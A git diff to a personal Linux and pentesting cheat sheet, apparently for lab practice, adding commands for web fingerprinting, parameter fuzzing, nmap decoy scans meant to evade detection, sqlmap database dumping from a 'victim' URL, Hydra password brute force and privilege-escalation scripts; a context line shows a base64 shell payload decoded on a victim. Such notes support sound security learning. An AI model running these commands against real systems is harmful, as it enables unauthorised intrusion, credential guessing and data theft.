@@ -3,6 +3,10 @@ Personal repository for linux commands
 
 ## General
 
+wc -l [file]
+
+>Show file lines
+
 netstat -rn 
 
 >Show active network disponibility
@@ -34,13 +38,55 @@ script NAME
 >**exit** in terminal for terminate
 
 
+sort -u
+
+>Remove duplicate output
+
+
 ## Scanning
 
 ### WEB SCAN
 
 Whatweb http://94.237.62.2/
 
-> out-> http://94.237.62.2 [301 Moved Permanently] Country[FINLAND][FI], IP[94.237.62.2], RedirectLocation[https://94.237.62.2/]
+> output -> http://94.237.62.2 [301 Moved Permanently] Country[FINLAND][FI], IP[94.237.62.2], RedirectLocation[https://94.237.62.2/]
+
+
+### FINGER PRINT VERIFICATION
+
+wafw00f -v [URL]
+
+>-v verbose mode
+
+### HTML TOOL (source code verification)
+
+Requirements: **sudo apt install golang -y**
+
+Install: **go get -u github.com/tomnomnom/hacks/html-tool**
+
+**echo "[URL]" | /root/go/bin/htmltool coments attribs src href**
+
+>can use: comments,tags,scripts,title,attribs src href
+>
+
+### JS TOOL (source code verification)
+
+Requirements: **sudo apt install golang -y**
+
+Install: **go install github.com/003random/getJS@latest**
+
+**/root/bin/getjs --url [URL]**
+
+### WFUZZ Brute force for parameters like dowload.php?file=a.php FUZZER
+
+**wfuzz -c -z file,[WORDLIST] https://example.com/download.php?FUZZ=download.php**
+
+>-c colorize output
+>
+>-z set a file, wordlist
+>
+>FUZZ field to fill word from wordlist
+
 
 ### LISTS
 
@@ -81,22 +127,56 @@ nmap -sC -sV -p21 [IP or URL]
 
 Example:
 
->nmap --script smb-os-discovery.nse -p445 10.10.10.40
+>**nmap --script smb-os-discovery.nse -p445 10.10.10.40**
 >
->--script use a script to reach something.
+>**--script** use a script to reach something.
 >
->-p445 is the port of scan
+>**-p445** is the port of scan
 >
 >10.10.10.40 is the IP
+>
+>**nmap -D RND:20** - used for not detected as a intruser, set 20 random ips for scan, decoy mode.
+>
+>
 
 
 ### WEB ENUMERATION
 
-gobuster -m [MODE] -u [URL] -w [LIST]
+gobuster -m [MODE] -u [URL] -w [LIST] -r --no-error -t 100
+
+>-r follow the redirected url
+>
+>--no-error dont show error
+>
+>-t threads to set for gobuster
 
 > Enumeration for discover paths on web server
 
 ![image](https://github.com/esmeraldino-lk/Linux-usseful-commands/assets/133903212/176134ff-14ae-4212-a163-e2c7e7d49df8)
+
+### SQL MAP
+
+**sqlmap -v -u [URL] --current-db --threads 10**
+
+**sqlmap -v -u [URL] --dbs --threads 10**
+
+**sqlmap -v -u [URL] -D [DATABASE] --tables**
+
+**sqlmap -v -u [URL] -D [DATABASE] --T [TABLE] --columns**
+
+**sqlmap -v -u [URL] -D [DATABASE] --T [TABLE] -C '[COLUMN],[COLUMN2]' --dump**
+
+>--current-db shows current database name
+>
+>--dbs for get all database names
+>
+>--tables to get tables
+>
+>-v verbose mode
+>
+>-u victim's url
+>
+>--threads NUMBER for set threads
 
 
 ### OTHERS
@@ -163,7 +243,27 @@ Python Server
 >VICTIM: echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
 
 
-### 
+## PRIVILEGE SCALATION
+
+Search and download Linenum.sh and Linpeas.sh for Linux.
+Winpeas for windows.
+
+
+##  BRUTE FORCE
+
+Hydra -v -t10 -l [LOGIN] -P [WORDLIST] [URL] -s [PORT]
+
+>t10 - 10 threads for use
+>
+>-v verbose mode
+>
+>-l login user
+>
+>-L login wordlist
+>
+>-p pass
+>
+>-P pass wordlist
 
 
 
